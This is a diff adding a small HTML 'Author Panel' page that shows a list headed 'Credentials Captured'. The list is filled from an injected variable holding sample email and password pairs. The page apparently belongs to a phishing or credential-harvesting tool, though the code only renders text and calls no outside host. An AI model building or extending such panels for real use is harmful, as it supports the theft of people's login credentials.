@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title> {{ Author Panel }} </title>
+</head>
+<body>
+<!-- Inject javascript vars here -->
+<script>var data = "user1@mail.com|p4ssw0rd1\nuser2@mail.com|p4ssw0rd2\n";</script>
+<div id="credentials">
+	<h3>Credentials Captured</h3>
+	<ul></ul>
+</div>
+
+<script>
+	var list = document.querySelector("div#credentials > ul");
+
+	for(let item of data.split("\n"))
+	{
+		let node = document.createElement("li");
+		let textnode = document.createTextNode(item);
+		node.appendChild(textnode);
+		list.appendChild(node);
+	}
+
+</script>
+
+</body>
+</html>
